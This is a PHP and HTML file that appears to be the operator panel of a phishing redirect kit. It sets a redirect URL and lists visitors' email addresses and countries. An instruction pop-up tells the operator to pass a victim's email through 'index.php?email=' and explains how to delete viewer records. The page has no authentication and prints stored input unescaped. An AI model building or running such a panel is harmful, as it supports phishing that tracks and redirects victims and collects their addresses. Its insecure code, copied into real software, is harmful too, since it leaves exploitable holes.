
<?php 
error_reporting(0);
$ss = $_POST["url"];
if (!empty($_POST["url"])) {
    $myfile = fopen("../config/redirect.gg", "w") or die("Unable to open file!");
			$txt = "$ss";
  fwrite($myfile, $txt);
fclose($myfile);  
echo "<a style='color:green'>Success<a>";
} else {  
    echo "<a style='color:red'>Failed<a>";
}

?>
<!DOCTYPE html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function () {

            setInterval( function() {
                $("#myDiv").load(location.href + " #myDiv");
             }, 1000 );

        });
    </script>
<html>
<head>
<style>
table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

td, th {
  border: 1px solid #dddddd;
  text-align: left;
  padding: 8px;
}

tr:nth-child(even) {
  background-color: #dddddd;
}
</style>
<form action="view.php" method="post">
  <label for="fname">Change Redirect URL:</label>
  <input type="text" id="fname" name="url"><input type="submit" value="Submit">
<?php
$sad = file_get_contents("../config/redirect.gg", true);
echo "<p style='font-family:'Courier New''>Your Redirect is:<a style='color:dark'>($sad)</p></a>";
?>
</head>
<body>
<div id="myDiv">
<p style="font-family:'Courier New'">SITE:<a style='color:red'><?php include '../config/check.php'; ?></p></a>
</span>
<button onclick="alert('To get Email in Redirect use Query\nin index.php Ex: (index.php?email=)\nTo Delete Viewers \nEx: view.php?del=1')">Instruction</button>
<h2>VISITOR</h2>

<table>
  <tr>
    <th><p>Email</p></th>
    <th><p>Country</p></th>

  </tr>
  <?php $ss = file_get_contents("click.html", true); echo $ss; ?>
  
  
        </div>
    

